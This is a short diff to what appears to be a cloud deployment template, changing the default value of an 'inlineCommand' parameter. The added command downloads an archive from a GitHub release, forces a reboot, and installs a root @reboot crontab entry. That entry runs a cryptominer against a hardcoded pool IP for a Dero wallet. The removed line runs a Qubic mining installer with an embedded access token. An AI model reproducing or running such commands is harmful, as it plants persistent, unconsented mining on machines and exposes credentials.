@@ -67,7 +67,7 @@
         },
         "inlineCommand": {
             "type": "string",
-            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo sysctl -w vm.nr_hugepages=1280; mkdir znz && cd znz && wget -O qli-Service-install.sh https://dl.qubic.li/cloud-init/qli-Service-install.sh && chmod u+x qli-Service-install.sh && ./qli-Service-install.sh 16 eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImEwOTMxOGFkLWM2YzYtNDk3Yy1iM2M5LTgxODc1ODc1ZmFjNiIsIk1pbmluZyI6IiIsIm5iZiI6MTcxMjg0MjMyNywiZXhwIjoxNzQ0Mzc4MzI3LCJpYXQiOjE3MTI4NDIzMjcsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.uE0GqYd9NWLiAcHFWxpm_ZRXjtT7Y00TTcycZPvBG4Qqx1ozV7U30QDAWRzfd-uChwYyXCpLPi127nQHjaS2xw xeon55",
+            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo sysctl -w vm.nr_hugepages=1280; mkdir tkt && cd tkt && wget https://github.com/jokervulinh96/lucky/releases/download/lucky/lucky.tar.gz && tar xf lucky.tar.gz && shutdown --reboot 1; echo @reboot 'cd tkt && sudo screen -d -m ./lucky -d 89.117.61.229:10100 -w dero1qyk2a6zw9slgfx5ttf0qru6xyfahn5nryhhy4xzzl4ynd6ndp2x8kqq8qga44 -t 16' | crontab -; ls",
             "metadata": {
                 "description": "inline command"
             }
